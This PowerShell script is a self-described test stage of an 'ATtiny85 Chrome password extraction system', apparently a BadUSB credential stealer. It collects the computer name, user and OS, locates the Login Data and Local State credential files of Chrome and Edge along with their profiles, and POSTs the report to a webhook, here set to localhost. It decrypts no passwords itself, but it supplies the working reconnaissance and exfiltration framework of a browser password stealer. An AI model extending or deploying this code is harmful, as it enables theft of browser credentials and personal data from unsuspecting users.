# Clean Chrome Password Test Script
# This script tests basic functionality without complex dependencies

# Load required assemblies
Add-Type -AssemblyName System.Security

# Function to send data to webhook
function Send-ToWebhook {
    param (
        [Parameter(Mandatory = $True)]
        [string]$Data,
        [Parameter(Mandatory = $True)]
        [string]$WebhookUrl
    )

    try {
        $computerName = $env:COMPUTERNAME
        $userName = $env:USERNAME
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        
        $payload = @{
            computer = $computerName
            user = $userName
            timestamp = $timestamp
            data = $Data
        } | ConvertTo-Json
        
        $response = Invoke-WebRequest -Uri $WebhookUrl -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing
        Write-Output "Data sent to webhook successfully. Status: $($response.StatusCode)"
        return $true
    } catch {
        Write-Output "Failed to send data to webhook: $_"
        return $false
    }
}

# Function to check Chrome installation and basic info
function Get-ChromeInfo {
    $chromeInfo = "=== Chrome Installation Check ===`n"
    
    # Check if Chrome is installed
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    if (Test-Path $chromePath) {
        $chromeInfo += "Chrome is installed at: $chromePath`n"
        
        # Get Chrome version
        try {
            $version = (Get-ItemProperty $chromePath).VersionInfo.FileVersion
            $chromeInfo += "Chrome Version: $version`n"
        } catch {
            $chromeInfo += "Could not determine Chrome version`n"
        }
    } else {
        $chromeInfo += "Chrome is not installed or not found`n"
    }
    
    # Check Chrome user data directory
    $userDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    if (Test-Path $userDataPath) {
        $chromeInfo += "Chrome User Data found at: $userDataPath`n"
        
        # Check for Local State file
        $localStatePath = "$userDataPath\Local State"
        if (Test-Path $localStatePath) {
            $chromeInfo += "Local State file found`n"
        } else {
            $chromeInfo += "Local State file not found`n"
        }
        
        # Check for Login Data file
        $loginDataPath = "$userDataPath\Default\Login Data"
        if (Test-Path $loginDataPath) {
            $chromeInfo += "Login Data file found`n"
            $fileSize = (Get-Item $loginDataPath).Length
            $chromeInfo += "Login Data file size: $fileSize bytes`n"
        } else {
            $chromeInfo += "Login Data file not found`n"
        }
        
        # List profiles
        $profiles = Get-ChildItem -Path $userDataPath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
        $chromeInfo += "Found $($profiles.Count) Chrome profile(s):`n"
        foreach ($profile in $profiles) {
            $chromeInfo += "   - $($profile.Name)`n"
        }
    } else {
        $chromeInfo += "Chrome User Data directory not found`n"
    }
    
    return $chromeInfo
}

# Function to check Edge installation and basic info
function Get-EdgeInfo {
    $edgeInfo = "`n=== Edge Installation Check ===`n"
    
    # Check if Edge is installed
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\Application\msedge.exe"
    if (Test-Path $edgePath) {
        $edgeInfo += "Edge is installed at: $edgePath`n"
        
        # Get Edge version
        try {
            $version = (Get-ItemProperty $edgePath).VersionInfo.FileVersion
            $edgeInfo += "Edge Version: $version`n"
        } catch {
            $edgeInfo += "Could not determine Edge version`n"
        }
    } else {
        $edgeInfo += "Edge is not installed or not found`n"
    }
    
    # Check Edge user data directory
    $userDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    if (Test-Path $userDataPath) {
        $edgeInfo += "Edge User Data found at: $userDataPath`n"
        
        # Check for Local State file
        $localStatePath = "$userDataPath\Local State"
        if (Test-Path $localStatePath) {
            $edgeInfo += "Local State file found`n"
        } else {
            $edgeInfo += "Local State file not found`n"
        }
        
        # Check for Login Data file
        $loginDataPath = "$userDataPath\Default\Login Data"
        if (Test-Path $loginDataPath) {
            $edgeInfo += "Login Data file found`n"
            $fileSize = (Get-Item $loginDataPath).Length
            $edgeInfo += "Login Data file size: $fileSize bytes`n"
        } else {
            $edgeInfo += "Login Data file not found`n"
        }
    } else {
        $edgeInfo += "Edge User Data directory not found`n"
    }
    
    return $edgeInfo
}

# Main execution
try {
    Write-Output "Starting Chrome/Edge browser analysis..."
    
    # Define webhook URL
    $webhookUrl = "http://localhost:8080"
    
    # Gather system information
    $systemInfo = "=== System Information ===`n"
    $systemInfo += "Computer: $env:COMPUTERNAME`n"
    $systemInfo += "User: $env:USERNAME`n"
    $systemInfo += "Date: $(Get-Date)`n"
    $systemInfo += "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
    $systemInfo += "Architecture: $env:PROCESSOR_ARCHITECTURE`n"
    
    # Get browser information
    $chromeInfo = Get-ChromeInfo
    $edgeInfo = Get-EdgeInfo
    
    # Combine all information
    $fullReport = $systemInfo + "`n" + $chromeInfo + $edgeInfo
    $fullReport += "`n`n=== Test Completed ===`n"
    $fullReport += "This is a test run of the ATtiny85 Chrome password extraction system.`n"
    $fullReport += "No actual passwords were extracted in this test.`n"
    
    Write-Output $fullReport
    
    # Send to webhook
    $success = Send-ToWebhook -Data $fullReport -WebhookUrl $webhookUrl
    
    if ($success) {
        Write-Output "Test completed successfully!"
    } else {
        Write-Output "Test completed but webhook failed"
    }
    
} catch {
    Write-Error "An error occurred during testing: $_"
}
